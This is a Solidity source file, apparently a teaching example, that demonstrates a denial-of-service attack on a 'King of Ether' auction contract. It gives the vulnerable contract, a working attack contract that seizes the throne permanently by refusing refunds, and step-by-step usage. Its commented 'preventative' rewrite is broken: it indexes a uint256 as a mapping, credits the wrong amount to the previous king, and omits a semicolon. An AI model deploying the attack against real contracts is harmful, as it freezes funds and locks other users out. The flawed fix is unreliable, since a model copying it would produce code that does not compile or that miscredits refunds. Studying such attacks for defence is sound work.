// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.24;

//vulnerability

//Denial of Service

/** There are many ways to attack  a smart contract to make it unusable
 * One exploit we introduce here is denial of service by making the function to send Ether fail.
 *
 */

/*
The goal of KingOfEther is to become the king by sending more Ether than
the previous king. Previous king will be refunded with the amount of Ether
he sent.
*/

/*
1. Deploy KingOfEther
2. Alice becomes the king by sending 1 Ether to claimThrone().
2. Bob becomes the king by sending 2 Ether to claimThrone().
   Alice receives a refund of 1 Ether.
3. Deploy Attack with address of KingOfEther.
4. Call attack with 3 Ether.
5. Current king is the Attack contract and no one can become the new king.

What happened?
Attack became the king. All new challenge to claim the throne will be rejected
since Attack contract does not have a fallback function, denying to accept the
Ether sent from KingOfEther before the new king is set.
*/

contract KingofEther {
    address public king;
    uint256 public balance;

    function calimThrone() external payable {
        require(msg.value > balance, "Need to pay more become the King");
        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attact {
    KingofEther kingofether;

    constructor(KingofEther _kingofEther) {
        kingofether = KingofEther(_kingofEther);
    }

    function attact() public payable {
        kingofether.calimThrone{value: msg.value}();
    }
}

/**Preventative Techniques
 */

/**
 * contract KingofEther {
    address public king;
    uint256 public balance;
    mapping(address => uint256) public balances;
    

    function calimThrone() external payable {
        require(msg.value > balance, "Need to pay more become the King");

        balance[king] += msg.value;

        balance = msg.value;
        king = msg.sender;
    }
    function withdraw() public{
        require(msg.sender !=king, "Current king cannot withdraw");

        uint256 amout = balances[msg.sender];
        balances[msg.sender] = 0

        (bool sent, ) = msg.sender.call{value: amout}("");
        require(sent, "Failed to send Ether");
    }



 */
